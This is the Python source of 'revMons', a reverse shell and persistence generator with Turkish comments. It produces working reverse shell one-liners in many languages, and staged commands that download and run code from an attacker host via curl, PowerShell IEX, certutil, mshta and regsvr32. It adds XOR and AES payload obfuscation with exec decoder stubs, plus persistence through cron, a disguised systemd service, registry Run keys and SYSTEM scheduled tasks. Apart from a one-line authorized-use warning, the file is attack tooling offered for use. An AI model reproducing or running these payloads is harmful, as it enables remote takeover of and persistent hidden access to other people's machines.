#!/usr/bin/env python3
"""
revMons - Gelişmiş Ters Kabuk & Kalıcılık Jeneratörü (Reverse Shell + Persistence)
Kapsamlı özellikler:
- 20+ dilde stageless/staged payload
- XOR / AES şifreleme ve şifre çözücü stub üretimi
- SSL/TLS destekli Python dinleyici
- SMB, RDP gibi protokollerden yararlanan payload'lar
- Kalıcılık (persistence) komutları: Linux (cron, systemd), Windows (Registry, Scheduled Task)
- Docker test laboratuvarı
- Bol Türkçe yardım ve açıklamalar
"""

import sys
import os
import time
import base64
import argparse
import socket
import ssl
import threading
import subprocess
import random
import string
import textwrap
from datetime import datetime

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ---------- BANNER ----------
def print_banner():
    RED = '\033[91m'
    RESET = '\033[0m'
    banner = fr"""
{RED}
        @@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@
   @@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@/      \@@@/   @
@@@@@@@@@@@@@@@@\      @@  @___@
@@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@
@@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@
 @@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\
   @@@@@@@@@@@@@|  | | | | | | | |
                 \_|_|_|_|_|_|_|_|
  __________________________________________________________________________
{RESET}
  ## revMons - Payload Generator ##
  @linkedin: Sercan K
  __________________________________________________________________________
    """
    print(banner)

# ---------- YARDIMCI FONKSİYONLAR ----------
def baslik_yaz(baslik):
    print("\n" + "="*70)
    print(f"  {baslik}")
    print("="*70)

def bilgi(mesaj):
    print(f"[*] {mesaj}")

def basari(mesaj):
    print(f"[+] {mesaj}")

def hata(mesaj):
    print(f"[-] {mesaj}")

def uyari(mesaj):
    print(f"[!] {mesaj}")

def xor_encrypt_decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def aes_encrypt(data, key):
    if not HAS_CRYPTO:
        raise ImportError("pycryptodome yüklü değil. 'pip install pycryptodome' ile kurun.")
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return iv + ciphertext

def aes_decrypt_code():
    return '''
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import sys, base64
key = b'{{KEY}}'
data = base64.b64decode('{{CIPHERTEXT_B64}}')
iv = data[:16]
ct = data[16:]
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct), AES.block_size)
exec(pt)
'''

def rastgele_anahtar(boyut=32):
    return os.urandom(boyut)

# ---------- PAYLOAD ÜRETİCİ (TÜMÜ BURADA!) ----------
def payload_olusturucu(ip, port):
    """TÜM payload'ları eksiksiz döner."""
    p = {}
    
    # ========== STAGELESS (Tek Aşamalı) ==========
    p["bash"] = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    p["sh"] = f"sh -i >& /dev/tcp/{ip}/{port} 0>&1"
    p["nc"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    p["nc_e"] = f"nc -e /bin/sh {ip} {port}"
    p["python3"] = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    p["php_exec"] = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    p["ruby"] = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    p["perl"] = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    p["powershell"] = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    p["awk"] = f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{do{{ printf \"> \" |& s; s |& getline c; if(c) while ((c |& getline) > 0) print $0 |& s; close(c)}} while(c != \"exit\"); s |& getline c; close(c)}}}}'"
    p["lua"] = f"lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{ip}\",{port});local i,o;while true do i,o=t:receive();if i then local r={{}};local p=io.popen(i,\"r\");for l in p:lines() do table.insert(r,l) end;t:send(table.concat(r,\"\\n\")..\"\\n\") end end'"

    # ========== STAGED (İki Aşamalı) ==========
    p["staged_wget"] = f"wget -qO- http://{ip}:8000/shell.py | python3"
    p["staged_curl"] = f"curl -s http://{ip}:8000/shell.py | python3"
    p["staged_certutil"] = f"certutil -urlcache -f http://{ip}:8000/shell.py %TEMP%\\shell.py && python3 %TEMP%\\shell.py"
    p["ps_staged"] = f"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:8000/shell.ps1')\""

    # ========== ÖZEL PROTOKOL PAYLOAD'LARI ==========
    p["socks_ssh"] = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -D 1080 -N -f kullanici@{ip}"
    p["dns_iodine"] = f"iodine -f -P 'sifre123' {ip}"
    p["go_staged"] = (
        f"echo 'package main;import\"net\";import\"os/exec\";import\"os\";"
        f"func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
        f"cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/r.go && go run /tmp/r.go"
    )
    p["rust_staged"] = (
        f"echo 'use std::net::TcpStream;use std::process::Command;use std::os::unix::io::AsRawFd;"
        f"fn main(){{let s=TcpStream::connect(\"{ip}:{port}\").unwrap();"
        f"let fd=s.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\")"
        f".stdin(unsafe{{std::fs::File::from_raw_fd(fd)}})"
        f".stdout(unsafe{{std::fs::File::from_raw_fd(fd)}})"
        f".stderr(unsafe{{std::fs::File::from_raw_fd(fd)}}).spawn().unwrap().wait().unwrap();}}' > /tmp/r.rs && rustc /tmp/r.rs -o /tmp/r && /tmp/r"
    )
    p["smb_exec"] = f"net use \\\\{ip}\\share /user:guest guest && \\\\{ip}\\share\\payload.exe"
    p["smb_powershell"] = f"net use \\\\{ip}\\share /user:guest guest && powershell -ep bypass -f \\\\{ip}\\share\\script.ps1"
    p["rdp_cmd"] = f"SharpRDP.exe computername={ip} command=\"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:8000/shell.ps1')\" username=kullanici password=sifre"
    p["mshta"] = f"mshta http://{ip}:8000/payload.hta"
    p["msiexec"] = f"msiexec /i http://{ip}:8000/payload.msi /quiet /qn"
    p["regsvr32"] = f"regsvr32 /u /s /i:http://{ip}:8000/payload.sct scrobj.dll"

    return p

# ---------- ŞİFRELEME MODÜLLERİ ----------
def payload_sifrele(payload, yontem, anahtar=None):
    if yontem == "xor":
        if not anahtar:
            anahtar = rastgele_anahtar(16)
        sifreli = xor_encrypt_decrypt(payload.encode(), anahtar)
        cozucu = f"python3 -c \"import sys;d=sys.stdin.buffer.read();k={anahtar};print(''.join(chr(d[i]^k[i%len(k)]) for i in range(len(d))))\" | bash"
        return {
            "sifreli_payload": base64.b64encode(sifreli).decode(),
            "cozucu_komut": cozucu,
            "anahtar": anahtar.hex(),
            "not": "XOR şifreli payload base64 olarak verilmiştir. Çözücü komut stdin'den okur."
        }
    elif yontem == "aes":
        if not HAS_CRYPTO:
            hata("AES için pycryptodome kurulu değil. 'pip install pycryptodome' ile kurun.")
            sys.exit(1)
        if not anahtar:
            anahtar = rastgele_anahtar(32)
        sifreli = aes_encrypt(payload.encode(), anahtar)
        cozucu_kod = aes_decrypt_code().replace('{{KEY}}', str(anahtar)).replace('{{CIPHERTEXT_B64}}', base64.b64encode(sifreli).decode())
        cozucu_b64 = base64.b64encode(cozucu_kod.encode()).decode()
        cozucu_komut = f"python3 -c \"import base64;exec(base64.b64decode('{cozucu_b64}'))\""
        return {
            "sifreli_payload": base64.b64encode(sifreli).decode(),
            "cozucu_komut": cozucu_komut,
            "anahtar": anahtar.hex(),
            "not": "AES-256-CBC ile şifrelenmiştir. Çözücü Python gerektirir."
        }
    else:
        hata("Desteklenmeyen şifreleme yöntemi.")
        sys.exit(1)

# ---------- KALICILIK (PERSISTENCE) ÜRETİCİ ----------
def persistence_olusturucu(hedef_isletim_sistemi, yontem, payload_komutu):
    if hedef_isletim_sistemi == "linux":
        if yontem == "cron":
            komut = f"(crontab -l 2>/dev/null; echo \"@reboot {payload_komutu}\") | crontab -"
        elif yontem == "systemd":
            komut = f"echo '[Unit]\\nDescription=Güncelleme Servisi\\n[Service]\\nExecStart={payload_komutu}\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/guncelleme.service && systemctl daemon-reload && systemctl enable guncelleme.service"
        else:
            komut = None
    elif hedef_isletim_sistemi == "windows":
        if yontem == "registry":
            komut = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Guncelleme /t REG_SZ /d \"{payload_komutu}\" /f"
        elif yontem == "schedtask":
            komut = f"schtasks /create /tn Guncelleme /tr \"{payload_komutu}\" /sc ONLOGON /ru SYSTEM /f"
        else:
            komut = None
    else:
        komut = None
    return komut

# ---------- SSL DİNLEYİCİ ----------
def ssl_dinleyici_baslat(ip, port, certfile="cert.pem", keyfile="key.pem"):
    if not os.path.exists(certfile) or not os.path.exists(keyfile):
        hata("SSL sertifikası bulunamadı. Önce '--ssl-sertifika-olustur' ile oluşturun.")
        sys.exit(1)
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((ip, port))
    server.listen(1)
    basari(f"SSL dinleyici {port} portunda başlatıldı (sertifika: {certfile})")
    bilgi("Bağlantı bekleniyor...")
    client, addr = server.accept()
    ssl_client = context.wrap_socket(client, server_side=True)
    basari(f"Şifreli bağlantı: {addr[0]}:{addr[1]}")
    def oku():
        while True:
            veri = ssl_client.recv(4096)
            if not veri:
                break
            sys.stdout.buffer.write(veri)
            sys.stdout.flush()
    threading.Thread(target=oku, daemon=True).start()
    try:
        while True:
            komut = input()
            ssl_client.send((komut + "\n").encode())
    except KeyboardInterrupt:
        print()
        bilgi("Bağlantı sonlandırılıyor.")
    finally:
        ssl_client.close()
        server.close()

def ssl_sertifika_olustur():
    bilgi("Kendinden imzalı SSL sertifikası oluşturuluyor...")
    try:
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", "key.pem", "-out", "cert.pem", "-days", "365", "-nodes", "-subj", "/CN=localhost"], check=True)
        basari("cert.pem ve key.pem oluşturuldu.")
    except Exception as e:
        hata(f"Sertifika oluşturulamadı: {e}")
        sys.exit(1)

# ---------- TEST LABORATUVARI ----------
def docker_test(ip, port, payload_adi):
    bilgi(f"Docker testi başlatılıyor: {payload_adi}")
    def dinleyici_thread_func():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(1)
        print("[DİNLEYİCİ] Bağlantı bekleniyor...")
        client, addr = server.accept()
        print(f"[DİNLEYİCİ] Bağlantı: {addr}")
        while True:
            veri = client.recv(4096)
            if not veri:
                break
            sys.stdout.buffer.write(veri)
            sys.stdout.flush()
        client.close()
    t = threading.Thread(target=dinleyici_thread_func, daemon=True)
    t.start()
    time.sleep(1)
    payloads = payload_olusturucu(ip, port)
    cmd = payloads.get(payload_adi)
    if not cmd:
        hata(f"{payload_adi} bulunamadı.")
        return
    docker_cmd = f'docker run --rm alpine:latest sh -c "apk add --no-cache python3 curl bash && {cmd}"'
    print(f"[TEST] Docker komutu: {docker_cmd}")
    subprocess.Popen(docker_cmd, shell=True)
    bilgi("Test başladı. Çıkmak için Ctrl+C")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        uyari("Test durduruldu.")

# ---------- ANA PROGRAM ----------
def main():
    print_banner()  # <-- BANNER BURADA ÇAĞRILIYOR
    
    parser = argparse.ArgumentParser(
        description="revMons - Gelişmiş Ters Kabuk ve Kalıcılık Aracı ",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
Kullanım örnekleri:
  Tüm payload listesini gör:  python3 revMons.py --list
  Bash payload'u göster:      python3 revMons.py -i 10.0.0.5 -p 4444 --payload bash
  Base64 ile göster:          python3 revMons.py -i 10.0.0.5 -p 4444 --payload bash -b
  XOR şifreli payload üret:   python3 revMons.py -i 10.0.0.5 -p 4444 --payload bash -e xor
  AES şifreli payload üret:   python3 revMons.py -i 10.0.0.5 -p 4444 --payload python3 -e aes
  SSL dinleyici başlat:       python3 revMons.py -l --ssl -p 4444
  Kalıcılık ekle (Linux cron): python3 revMons.py -i 10.0.0.5 -p 4444 --payload bash --persist linux cron
  Kalıcılık ekle (Windows registry): python3 revMons.py -i 10.0.0.5 -p 4444 --payload powershell --persist windows registry
  Docker ile test et:         python3 revMons.py -i 10.0.0.5 -p 4444 --test bash
  SMB üzerinden payload:      python3 revMons.py -i 10.0.0.5 -p 4444 --payload smb_exec
  DNS tünel payload'u:        python3 revMons.py -i 10.0.0.5 -p 4444 --payload dns_iodine
  LOLBAS Mshta:               python3 revMons.py -i 10.0.0.5 -p 4444 --payload mshta

UYARI: Yalnızca yetkili testlerde kullanın. İzinsiz kullanım suçtur.
        """))
    parser.add_argument("-i", "--ip", help="Dinleyici IP adresi (payload üretimi için zorunlu)")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Port numarası (varsayılan: 4444)")
    parser.add_argument("-l", "--listen", action="store_true", help="Python dinleyici başlat (netcat alternatif)")
    parser.add_argument("--ssl", action="store_true", help="SSL/TLS dinleyici kullan (--listen ile birlikte)")
    parser.add_argument("--ssl-sertifika-olustur", action="store_true", help="Kendinden imzalı SSL sertifikası oluştur (cert.pem, key.pem)")
    parser.add_argument("--list", action="store_true", help="Tüm payload isimlerini listele")
    parser.add_argument("--payload", help="Belirtilen payload'ı göster")
    parser.add_argument("-b", "--base64", action="store_true", help="Payload'u Base64 kodla")
    parser.add_argument("-e", "--encrypt", choices=["xor", "aes"], help="Payload'u şifrele (xor veya aes)")
    parser.add_argument("--key", help="Şifreleme için hex formatında anahtar (isteğe bağlı, yoksa rastgele üretilir)")
    parser.add_argument("-o", "--output", help="Çıktıyı dosyaya kaydet")
    parser.add_argument("--test", help="Docker konteynerinde payload'u test et (payload adı girin)")
    parser.add_argument("--persist", nargs=2, metavar=("ISLETIM_SISTEMI", "YONTEM"),
                        help="Kalıcılık (persistence) komutu ekle. Örn: linux cron, windows registry")
    args = parser.parse_args()

    # Sertifika oluşturma
    if args.ssl_sertifika_olustur:
        ssl_sertifika_olustur()
        sys.exit(0)

    # Payload listeleme
    if args.list:
        baslik_yaz("Mevcut Payload'lar ve Açıklamaları")
        payloads = payload_olusturucu("10.0.0.1", 4444)
        
        aciklamalar = {
            "bash": "Bash TCP - /dev/tcp ile ters kabuk",
            "sh": "SH TCP - sh shell ile ters kabuk",
            "nc": "Netcat pipe - mkfifo ile ters kabuk",
            "nc_e": "Netcat -e - e parametresi ile ters kabuk",
            "python3": "Python3 - Python socket ters kabuk",
            "php_exec": "PHP exec - PHP fsockopen ile ters kabuk",
            "ruby": "Ruby - Ruby TCPSocket ters kabuk",
            "perl": "Perl - Perl socket ters kabuk",
            "powershell": "PowerShell - Windows PowerShell ters kabuk",
            "awk": "AWK - GNU AWK network ile ters kabuk",
            "lua": "Lua - Lua socket ters kabuk",
            "staged_wget": "Staged wget - wget ile 2. aşama indirir",
            "staged_curl": "Staged curl - curl ile 2. aşama indirir",
            "staged_certutil": "Staged certutil - Windows certutil ile indirir",
            "ps_staged": "PowerShell Staged - IEX ile bellekten çalıştırır",
            "socks_ssh": "SOCKS Proxy - SSH dinamik port yönlendirme",
            "dns_iodine": "DNS Tünel - iodine ile DNS üzerinden tünel",
            "go_staged": "Go Staged - Go ile derlenmiş ters kabuk",
            "rust_staged": "Rust Staged - Rust ile derlenmiş ters kabuk",
            "smb_exec": "SMB Exec - SMB paylaşımından exe çalıştırır",
            "smb_powershell": "SMB PowerShell - SMB'den PowerShell script çalıştırır",
            "rdp_cmd": "RDP Command - SharpRDP ile RDP üzerinden komut",
            "mshta": "Mshta - LOLBAS, HTA dosyası çalıştırır",
            "msiexec": "Msiexec - LOLBAS, uzaktan .msi kurar",
            "regsvr32": "Regsvr32 - LOLBAS, uzaktan .sct çalıştırır",
        }
        
        for i, ad in enumerate(payloads.keys(), 1):
            aciklama = aciklamalar.get(ad, "")
            print(f"  {i:2d}. {ad:20s} - {aciklama}")
        sys.exit(0)

    # Dinleyici modu
    if args.listen:
        if args.ssl:
            ssl_dinleyici_baslat("0.0.0.0", args.port)
        else:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", args.port))
            server.listen(1)
            basari(f"Python dinleyici {args.port} portunda başlatıldı.")
            bilgi("Bağlantı bekleniyor...")
            client, addr = server.accept()
            basari(f"Bağlantı: {addr[0]}:{addr[1]}")
            def oku():
                while True:
                    veri = client.recv(4096)
                    if not veri:
                        break
                    sys.stdout.buffer.write(veri)
                    sys.stdout.flush()
            threading.Thread(target=oku, daemon=True).start()
            try:
                while True:
                    komut = input()
                    client.send((komut + "\n").encode())
            except KeyboardInterrupt:
                print()
                bilgi("Dinleyici kapatılıyor.")
            finally:
                client.close()
                server.close()
        sys.exit(0)

    if not args.ip and not args.test:
        parser.print_help()
        print("\nHata: IP adresi gerekli (-i)")
        sys.exit(1)

    ip = args.ip or "127.0.0.1"
    port = args.port

    if args.test:
        docker_test(ip, port, args.test)
        sys.exit(0)

    payloads = payload_olusturucu(ip, port)
    if args.payload:
        if args.payload not in payloads:
            hata(f"'{args.payload}' bulunamadı. --list ile listeyi görebilirsiniz.")
            sys.exit(1)
        secili_payload = payloads[args.payload]
    else:
        hata("Hangi payload'ı istediğinizi --payload ile belirtin.")
        sys.exit(1)

    if args.persist:
        os_type, method = args.persist
        pers_cmd = persistence_olusturucu(os_type, method, secili_payload)
        if pers_cmd:
            basari(f"{os_type} için {method} kalıcılık komutu:")
            print(pers_cmd)
        else:
            hata("Geçersiz kalıcılık seçimi.")
        sys.exit(0)

    if args.encrypt:
        key_bytes = None
        if args.key:
            key_bytes = bytes.fromhex(args.key)
        sonuc = payload_sifrele(secili_payload, args.encrypt, key_bytes)
        baslik_yaz(f"Şifreli Payload ({args.encrypt.upper()})")
        print(f"Şifreli payload (base64):\n{sonuc['sifreli_payload']}\n")
        print(f"Çözücü komut:\n{sonuc['cozucu_komut']}\n")
        print(f"Anahtar (hex): {sonuc['anahtar']}")
        print(f"Not: {sonuc['not']}")
        if args.output:
            with open(args.output, "w") as f:
                f.write(f"# {args.encrypt.upper()} Şifreli Payload\n")
                f.write(f"# Anahtar: {sonuc['anahtar']}\n")
                f.write(f"Şifreli: {sonuc['sifreli_payload']}\n")
                f.write(f"Çözücü: {sonuc['cozucu_komut']}\n")
            basari(f"Sonuç {args.output} dosyasına yazıldı.")
        sys.exit(0)

    baslik_yaz(f"Payload: {args.payload}")
    print(secili_payload)
    if args.base64:
        print(f"\n[Base64]: {base64.b64encode(secili_payload.encode()).decode()}")

    if args.output:
        with open(args.output, "w") as f:
            f.write(secili_payload)
        basari(f"Payload {args.output} dosyasına kaydedildi.")

if __name__ == "__main__":
    main()
